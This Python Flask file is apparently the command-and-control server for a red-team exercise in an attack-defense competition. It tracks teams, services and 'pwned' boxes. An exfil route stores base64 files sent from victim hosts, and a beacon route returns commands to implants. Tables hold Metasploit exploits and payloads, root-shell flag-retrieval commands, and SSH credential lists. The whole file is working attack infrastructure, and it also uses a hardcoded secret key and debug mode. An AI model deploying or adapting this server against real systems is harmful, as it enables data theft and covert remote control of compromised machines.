from base64 import b64decode
from datetime import datetime

from flask import Flask, request, render_template, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

# Constants
PORT = 80
DEBUG = True
TEMPLATE_DIR = "templates"
DB_FILE = "c2.db"
LOG_FILE = "c2.log"

# Default settings
DEFAULT_SUBNET = "172.16.T.B"
DEFAULT_WHITELISTED_IPS = "127.0.0.1"

# Create Flask and database
app = Flask(__name__, template_folder=TEMPLATE_DIR)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
app.secret_key = "poop"
db = SQLAlchemy(app)


def main():
    # Create the database
    db.create_all()

    # Create default settings
    if not Setting.query.get("subnet"):
        db.session.add(Setting("subnet", DEFAULT_SUBNET,
                               "Subnet teams are on, T should replace team number and B should replace box IP"))
        db.session.commit()
    if not Setting.query.get("whitelisted_ips"):
        db.session.add(Setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                               "IPs, separated by commas and no spaces, that are allowed to access admin site"))
        db.session.commit()

    # Start Flask
    app.run(port=PORT, debug=DEBUG)


# Protect the admin routes
@app.before_request
def check_admin():
    settings = Setting.query.get("whitelisted_ips")
    ips = settings.value.split(",")
    if request.path.startswith("/admin") and request.remote_addr not in ips:
        return ""


@app.route("/admin/settings", methods=["GET"])
def admin_settings():
    return render_template("settings.html", settings=Setting.query.all())


@app.route("/admin/settings/update", methods=["POST"])
def admin_settings_update():
    # Get form data
    name = request.form.get("name")
    value = request.form.get("value")

    # Update in database
    setting = Setting.query.get(name)
    setting.value = value
    db.session.commit()

    # Flash and redirect
    flash("Setting updated")
    return redirect(url_for("admin_settings"))


@app.route("/admin/teams", methods=["GET"])
def admin_teams():
    return render_template("teams.html", teams=Team.query.order_by(Team.num).all())


@app.route("/admin/teams/add", methods=["POST"])
def admin_teams_add():
    # Get form data
    num = request.form.get("num")
    name = request.form.get("name")

    # Add to database
    db.session.add(Team(num, name))
    for service in Service.query.all():
        db.session.add(Box(num, service.ip, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Team added")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/delete", methods=["GET"])
def admin_teams_delete():
    # Get parameters
    num = request.args.get("num")

    # Delete from database
    # Box.query.filter_by(team=num).delete()
    # Flag.query.filter_by(team=num).delete()
    # ExfilData.query.filter_by(team=num).delete()
    # Team.query.filter_by(num=num).delete()
    team = Team.query.get(num)
    db.session.delete(team)
    db.session.commit()

    # Flash and redirect
    flash("Team deleted")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/update", methods=["POST"])
def admin_teams_update():
    # Get form data
    old_num = request.form.get("old_num")
    num = request.form.get("num")
    name = request.form.get("name")

    # Update in database
    team = Team.query.get(old_num)
    team.num = num
    team.name = name
    # if old_num != num:
    #     for box in Box.query.filter_by(team=old_num):
    #         box.team = num
    #     for flag in Flag.query.filter_by(team=old_num):
    #         flag.team = num
    #     for exfil_data in ExfilData.query.filter_by(team=old_num):
    #         exfil_data.team = num
    db.session.commit()

    # Flash and redirect
    flash("Team updated")
    return redirect(url_for("admin_teams"))


@app.route("/admin/services", methods=["GET"])
def admin_services():
    return render_template("services.html", services=Service.query.order_by(Service.ip).all())


@app.route("/admin/services/add", methods=["POST"])
def admin_services_add():
    # Get form data
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Add to database
    db.session.add(Service(ip, name, port, ssh_port))
    for team in Team.query.all():
        db.session.add(Box(ip, team.num, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Service added")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/delete", methods=["GET"])
def admin_services_delete():
    # Get parameters
    ip = request.args.get("ip")

    # Delete from database
    # Box.query.filter_by(service=ip).delete()
    # Flag.query.filter_by(service=ip).delete()
    # ExfilData.query.filter_by(service=ip).delete()
    # MSFExploit.query.filter_by(service=ip).delete()
    # FlagRetrieval.query.filter_by(service=ip).delete()
    # Service.query.filter_by(ip=ip).delete()
    service = Service.query.get(ip)
    db.session.delete(service)
    db.session.commit()

    # Flash and redirect
    flash("Service deleted")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/update", methods=["POST"])
def admin_services_update():
    # Get form data
    old_ip = request.form.get("old_ip")
    ip = request.form.get("ip")
    name = request.form.get("name")
    port = request.form.get("port")
    ssh_port = request.form.get("ssh_port")

    # Update in database
    service = Service.query.get(old_ip)
    service.ip = ip
    service.name = name
    service.port = port
    service.ssh_port = ssh_port
    # if old_ip != ip:
    #     for box in Box.query.filter_by(service=old_ip):
    #         box.service = ip
    #     for flag in Flag.query.filter_by(service=old_ip):
    #         flag.service = ip
    #     for exfil_data in ExfilData.query.filter_by(service=old_ip):
    #         exfil_data.service = ip
    #     for msf_exploit in MSFExploit.query.filter_by(service=old_ip):
    #         msf_exploit.service = ip
    #     for flag_retrieval in FlagRetrieval.query.filter_by(service=old_ip):
    #         flag_retrieval.service = ip
    db.session.commit()

    # Flash and redirect
    flash("Service updated")
    return redirect(url_for("admin_services"))


@app.route("/admin/boxes", methods=["GET"])
def admin_boxes():
    return render_template("boxes.html", boxes=Box.query.order_by(Box.team_num, Box.service_ip).all())


# @app.route("/admin/flags", methods=["GET"])
# def admin_flags():
#     return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all())


# Exfil route
@app.route("/e", methods=["POST"])
def exfil():
    # Get form data
    victimip = request.form.get("victimip")
    filename = request.form.get("filename")
    data = request.form.get("file")

    # Check if it exists
    if not victimip:
        log("Exfil - victimip missing")
        return ""
    elif not filename:
        log("Exfil - filename missing")
        return ""
    elif not data:
        log("Exfil - file missing")
        return ""

    # Decode data
    try:
        exfil = b64decode(data).decode("utf-8")
    except:
        log(f"Exfil - b64 decode error for {data} on host {victimip}")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log(f"Exfil - error decoding IP {victimip} for file {filename}")
        return ""

    # Save the data
    try:
        db.session.add(ExfilData(team, service, filename, exfil, datetime.now()))
        db.session.commit()
    except:
        log(f"Exfil - error adding data for team {team} and service {service} for file {filename}")
        return ""
    log(f"Exfil - saved data from team {team} and service {service}")
    return ""


# Update route
@app.route("/u", methods=["POST"])
def update():
    # Get form data
    victimip = request.form.get("victimip")

    # Check if it exists
    if not victimip:
        log("Update - victimip missing")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log(f"Update - error decoding IP {victimip}")
        return ""

    # Get the Box
    box = Box.query.get((team, service))
    if not box:
        log(f"Update - no record for team {team} and service {service}")
        return ""

    # Update the Box
    box.pwned = True
    box.last_update = datetime.now()
    db.session.commit()

    # Return the status
    log(f"Update - status {box.status} sent to team {team} and service {service}")
    return box.status


# Catch all 404s and 405s
@app.errorhandler(404)
@app.errorhandler(405)
def catch_all(e):
    return ""


def get_ip(subnet, team, service):
    return subnet.replace("T", team.num).replace("B", service.ip)


def log(info):
    print(info)
    with open(LOG_FILE, "a+") as f:
        f.write(f"{datetime_string()} - {info}\n")


def datetime_string():
    return datetime.now().strftime("%m/%d/%Y %H:%M:%S")


class Setting(db.Model):
    name = db.Column(db.Text, primary_key=True)
    value = db.Column(db.Text, nullable=False)
    description = db.Column(db.Text, nullable=False)

    def __init__(self, name, value, description):
        self.name = name
        self.value = value
        self.description = description


class Team(db.Model):
    num = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Text, nullable=False)

    def __init__(self, num, name):
        self.num = num
        self.name = name


class Service(db.Model):
    ip = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.Integer, nullable=False)
    port = db.Column(db.Integer, nullable=False)
    ssh_port = db.Column(db.Integer, nullable=False)

    def __init__(self, ip, name, port, ssh_port):
        self.ip = ip
        self.name = name
        self.port = port
        self.ssh_port = ssh_port


class Box(db.Model):
    team_num = db.Column(db.Integer, db.ForeignKey("team.num"), primary_key=True)
    team = db.relationship(Team, backref=db.backref("boxes", cascade="all, delete-orphan"))
    service_ip = db.Column(db.Integer, db.ForeignKey("service.ip"), primary_key=True)
    service = db.relationship(Service, backref=db.backref("boxes", cascade="all, delete-orphan"))
    pwned = db.Column(db.Boolean, nullable=False)
    last_update = db.Column(db.DateTime, nullable=True)
    flags = db.Column(db.Boolean, nullable=False)
    last_flag = db.Column(db.DateTime, nullable=True)

    def __init__(self, team_num, service_ip, pwned, last_update, flags, last_flag):
        self.team_num = team_num
        self.service_ip = service_ip
        self.pwned = pwned
        self.last_update = last_update
        self.flags = flags
        self.last_flag = last_flag


class Flag(db.Model):
    flag = db.Column(db.Text, primary_key=True)
    team = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    service = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    found = db.Column(db.DateTime, nullable=False)
    submitted = db.Column(db.DateTime, nullable=True)

    def __init__(self, flag, team, service, found, submitted):
        self.flag = flag
        self.team = team
        self.service = service
        self.found = found
        self.submitted = submitted


class ExfilData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    team = db.Column(db.Integer, db.ForeignKey("team.num"), nullable=False)
    service = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    filename = db.Column(db.Text, nullable=False)
    data = db.Column(db.Text, nullable=False)
    found = db.Column(db.DateTime, nullable=False)

    def __init__(self, team, service, filename, data, found):
        self.team = team
        self.service = service
        self.filename = filename
        self.data = data
        self.found = found


class MSFExploit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    exploit = db.Column(db.Text, nullable=False)
    options = db.Column(db.Text, nullable=False)
    payload = db.Column(db.Text, nullable=False)

    def __init__(self, service, exploit, options, payload):
        self.service = service
        self.exploit = exploit
        self.options = options
        self.payload = payload


class FlagRetrieval(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    service = db.Column(db.Integer, db.ForeignKey("service.ip"), nullable=False)
    root_shell = db.Column(db.Boolean, nullable=False)
    command = db.Column(db.Text, nullable=False)

    def __init__(self, service, root_shell, command):
        self.service = service
        self.root_shell = root_shell
        self.command = command


class SSHUsername(db.Model):
    username = db.Column(db.Text, primary_key=True)

    def __init__(self, username):
        self.username = username


class SSHPassword(db.Model):
    password = db.Column(db.Text, primary_key=True)

    def __init__(self, password):
        self.password = password


if __name__ == "__main__":
    main()
